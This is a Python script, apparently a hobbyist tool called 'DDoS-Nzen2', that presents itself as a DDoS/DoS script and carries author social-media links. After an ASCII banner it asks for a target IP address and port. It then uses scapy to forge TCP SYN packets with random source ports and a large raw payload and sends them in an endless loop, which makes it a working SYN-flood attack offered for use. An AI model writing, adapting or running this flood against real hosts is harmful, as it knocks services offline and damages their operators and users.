#DDoS.py

#Imports:
import os
import sys
import subprocess
import asyncio
from platform import platform
from os import listdir
os.system('pip3 install scapy')
from scapy.all import *
import _thread




version = 'v Alpha 0.1'

# Change version in var

title = '''

A DDoS/ DoS script written in Python, the upgraded version of the Batch version.

srforek

 __  _ ___ ___ __  _ ___        __  __   __    __
|  \| |_  | __|  \| (_  |  __  | _\| _\ /__\ /' _/
| | ' |/ /| _|| | ' |/ /  |__| | v | v | \/ |`._`.
|_|\__|___|___|_|\__|___|      |__/|__/ \__/ |___/


'''+version+'''

:DDoS/ DoS python script:

By editor99


Github repo: https://github.com/Gteditor99/DDOS-Nzen2

Youtube: https://www.youtube.com/channel/UCrxNyJTsVtg5pSq3AYbhiAw

Discord: editor99#6207



        '''


logoascii = '''

 __  _ ___ ___ __  _ ___        __  __   __    __
|  \| |_  | __|  \| (_  |  __  | _\| _\ /__\ /' _/
| | ' |/ /| _|| | ' |/ /  |__| | v | v | \/ |`._`.
|_|\__|___|___|_|\__|___|      |__/|__/ \__/ |___/



             '''




# Function for Main Screen, (mainscr) for easy access.

def mainscr():

    os.system("cls")
    print(title)

    os.system("pause")

mainscr()



os.system("cls")


sc2 = '''


    Enter the destination IP Address:
    then,
    Enter the port:

    ex: xxx.xxx.x.x (Enter)
    xx (Enter)


      (Localhost is the Local IP)
      (Port 80 is the most common ICP, HTTP. )


       '''





# Function for Second Screen, (secondscr) for easy access.
def secondscr():
    os.system('cls')

    print(sc2)

    print(logoascii)


print(secondscr())







target_ip = input("IP:")
target_port = input("Port:")





def DoS_synflood():
    # forge IP packet with target ip as the destination IP address

    ip = IP(dst=target_ip)

    # forge a TCP SYN packet with a random source port
    # and the target port as the destination port

    tcp = TCP(sport=RandShort(), dport=int(target_port), flags="S")

    # add some flooding data (1kb in this case)
    raw = Raw(b"X"*65000)

    # stack up the layers
    p = ip / tcp / raw

    # send the constructed packet in a loop until CTRL+C is detected
    send(p, loop=1)












os.system('pause')

_thread.start_new_thread(DoS_synflood())


input("Press Enter to exit:")

# Yo buddy, still alive?
